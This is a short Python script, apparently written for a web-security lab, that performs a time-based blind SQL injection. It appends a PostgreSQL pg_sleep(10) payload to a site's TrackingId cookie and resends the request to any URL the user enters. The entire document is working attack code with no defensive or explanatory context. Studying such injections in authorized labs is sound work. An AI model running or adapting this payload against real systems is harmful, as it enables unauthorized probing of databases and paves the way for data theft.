#Blind SQL injection with time delays
import requests
url = input("enter url : ")
r=requests.get(url)
cookies = r.cookies.get_dict()
cookies['TrackingId']=cookies['TrackingId']+'\'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(10) END)||\''
print(cookies)
r = requests.get(url,cookies=cookies)

